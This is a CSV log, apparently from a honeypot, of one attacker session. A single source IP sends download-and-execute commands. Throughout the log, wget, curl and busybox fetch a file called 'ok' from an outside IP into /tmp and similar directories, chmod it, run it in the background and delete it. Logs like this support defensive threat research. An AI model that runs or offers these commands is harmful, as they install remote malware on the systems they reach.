timestamp,src_ip,session,input,failed
2026-08-26 05:18:59.282939+00:00,45.198.224.26,374015e06f00,(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &,False
2026-08-26 05:18:59.291691+00:00,45.198.224.26,374015e06f00,cd /tmp,False
2026-08-26 05:18:59.301638+00:00,45.198.224.26,374015e06f00,wget http://5.182.210.174/ok,False
2026-08-26 05:18:59.609606+00:00,45.198.224.26,374015e06f00,curl -O http://5.182.210.174/ok,False
2026-08-26 05:18:59.625216+00:00,45.198.224.26,374015e06f00,chmod +x ok,False
2026-08-26 05:18:59.634129+00:00,45.198.224.26,374015e06f00,sh ok,False
2026-08-26 05:18:59.642019+00:00,45.198.224.26,374015e06f00,rm -rf ok,False
2026-08-26 05:18:59.644278+00:00,45.198.224.26,374015e06f00,rm -rf ok.1,False
2026-08-26 05:18:59.646573+00:00,45.198.224.26,374015e06f00,& ,True
2026-08-26 05:18:59.665300+00:00,45.198.224.26,374015e06f00,(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &,False
2026-08-26 05:18:59.667351+00:00,45.198.224.26,374015e06f00,cd /tmp,False
2026-08-26 05:18:59.668959+00:00,45.198.224.26,374015e06f00,cd /var/tmp,False
2026-08-26 05:18:59.671249+00:00,45.198.224.26,374015e06f00,cd /dev,False
2026-08-26 05:18:59.672771+00:00,45.198.224.26,374015e06f00,rm -rf ok ok.1,False
2026-08-26 05:18:59.674160+00:00,45.198.224.26,374015e06f00,busybox wget http://5.182.210.174/ok,False
2026-08-26 05:18:59.679741+00:00,45.198.224.26,374015e06f00,wget http://5.182.210.174/ok,False
2026-08-26 05:18:59.684452+00:00,45.198.224.26,374015e06f00,/userfs/bin/wget http://5.182.210.174/ok,False
2026-08-26 05:18:59.685212+00:00,45.198.224.26,374015e06f00,/userfs/bin/wget http://5.182.210.174/ok,True
2026-08-26 05:18:59.686098+00:00,45.198.224.26,374015e06f00,curl -O http://5.182.210.174/ok,False
2026-08-26 05:18:59.689608+00:00,45.198.224.26,374015e06f00,busybox curl -O http://5.182.210.174/ok,False
2026-08-26 05:18:59.691873+00:00,45.198.224.26,374015e06f00,chmod 777 ok,False
2026-08-26 05:18:59.693332+00:00,45.198.224.26,374015e06f00,./ok,False
2026-08-26 05:18:59.694024+00:00,45.198.224.26,374015e06f00,./ok ,True
2026-08-26 05:18:59.694637+00:00,45.198.224.26,374015e06f00,sh ok,False
2026-08-26 05:18:59.696100+00:00,45.198.224.26,374015e06f00,busybox sh ok,False
2026-08-26 05:18:59.697912+00:00,45.198.224.26,374015e06f00,rm -rf ok ok.1,False
2026-08-26 05:18:59.699806+00:00,45.198.224.26,374015e06f00,& ,True
2026-08-26 05:18:59.700973+00:00,45.198.224.26,374015e06f00,exit,False
